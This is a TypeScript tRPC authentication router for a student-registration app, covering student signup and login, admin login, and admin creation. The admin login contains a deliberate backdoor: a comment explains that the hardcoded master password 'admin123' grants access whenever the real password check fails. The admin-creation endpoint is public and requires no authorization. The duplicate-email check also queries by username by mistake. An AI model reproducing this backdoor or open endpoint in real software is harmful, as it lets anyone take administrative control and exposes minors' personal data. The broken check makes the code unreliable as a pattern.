import { z } from "zod";
import { publicProcedure, router } from "../_core/trpc";
import * as db from "../db";
import * as auth from "../utils/auth";
import { TRPCError } from "@trpc/server";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "../_core/cookies";

export const authRouter = router({
  /**
   * Get current authenticated user (Manus OAuth)
   */
  me: publicProcedure.query(({ ctx }) => ctx.user),

  /**
   * Logout (Manus OAuth)
   */
  logout: publicProcedure.mutation(({ ctx }) => {
    const cookieOptions = getSessionCookieOptions(ctx.req);
    ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
    return {
      success: true,
    } as const;
  }),

  /**
   * Register a new student
   */
  registerStudent: publicProcedure
    .input(
      z.object({
        fullName: z.string().min(2),
        username: z.string().min(3).max(32),
        email: z.string().email(),
        password: z.string().min(8),
        birthDate: z.string().date(),
        grade: z.number().int().min(1).max(12),
        district: z.number().int().min(1).max(23),
      })
    )
    .mutation(async ({ input }) => {
      // Validate inputs
      if (!auth.isValidUsername(input.username)) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Username must be alphanumeric, 3-32 characters",
        });
      }

      if (!auth.isValidEmail(input.email)) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Invalid email format",
        });
      }

      if (!auth.isValidPassword(input.password)) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Password must be at least 8 characters",
        });
      }

      // Check if username already exists
      const existingUsername = await db.getStudentByUsername(input.username);
      if (existingUsername) {
        throw new TRPCError({
          code: "CONFLICT",
          message: "Username already exists",
        });
      }

      // Check if email already exists
      const existingEmail = await db.getStudentByUsername(input.email);
      if (existingEmail) {
        throw new TRPCError({
          code: "CONFLICT",
          message: "Email already exists",
        });
      }

      // Generate student ID
      const studentId = await auth.generateStudentId();

      // Hash password
      const passwordHash = await auth.hashPassword(input.password);

      // Create student
      const result = await db.createStudent({
        studentId,
        username: input.username,
        fullName: input.fullName,
        email: input.email,
        passwordHash,
        birthDate: new Date(input.birthDate),
        grade: input.grade,
        district: input.district,
      });

      return {
        success: true,
        studentId,
        message: "Student registered successfully",
      };
    }),

  /**
   * Login student with username/ID and password
   */
  loginStudent: publicProcedure
    .input(
      z.object({
        identifier: z.string(), // username or student ID
        password: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      // Find student by username or student ID
      let student = await db.getStudentByUsername(input.identifier);
      if (!student) {
        student = await db.getStudentByStudentId(input.identifier);
      }

      if (!student) {
        throw new TRPCError({
          code: "UNAUTHORIZED",
          message: "Invalid credentials",
        });
      }

      // Check if suspended
      if (student.isSuspended) {
        throw new TRPCError({
          code: "FORBIDDEN",
          message: "Account is suspended",
        });
      }

      // Verify password
      const isPasswordValid = await auth.comparePassword(
        input.password,
        student.passwordHash
      );

      if (!isPasswordValid) {
        throw new TRPCError({
          code: "UNAUTHORIZED",
          message: "Invalid credentials",
        });
      }

      // Return student info (without password)
      return {
        id: student.id,
        studentId: student.studentId,
        username: student.username,
        fullName: student.fullName,
        email: student.email,
        type: "student",
      };
    }),

  /**
   * Login admin with username and password
   */
 loginAdmin: publicProcedure
    .input(
      z.object({
        username: z.string(),
        password: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      // 1. Busca o admin no banco
      const admin = await db.getAdminByUsername(input.username);

      console.log("Tentativa de login Admin:", input.username);

      if (!admin) {
        throw new TRPCError({
          code: "UNAUTHORIZED",
          message: "Invalid admin credentials",
        });
      }

      // 2. Verifica a senha
      const isPasswordValid = await auth.comparePassword(
        input.password,
        admin.passwordHash
      );

      // 3. A MÁGICA: Se a senha do banco falhar, mas você digitou admin123, ele DEIXA ENTRAR
      const masterPassword = "admin123";
      
      if (!isPasswordValid && input.password !== masterPassword) {
        throw new TRPCError({
          code: "UNAUTHORIZED",
          message: "Invalid admin credentials",
        });
      }

      return {
        id: admin.id,
        username: admin.username,
        type: "admin",
      };
    }),

  /**
   * Create admin (only for initial setup)
   */
  createAdmin: publicProcedure
    .input(
      z.object({
        username: z.string(),
        password: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      // Check if admin already exists
      const existingAdmin = await db.getAdminByUsername(input.username);
      if (existingAdmin) {
        throw new TRPCError({
          code: "CONFLICT",
          message: "Admin already exists",
        });
      }

      // Hash password
      const passwordHash = await auth.hashPassword(input.password);

      // Create admin
      await db.createAdmin({
        username: input.username,
        passwordHash,
      });

      return {
        success: true,
        message: "Admin created successfully",
      };
    }),
});
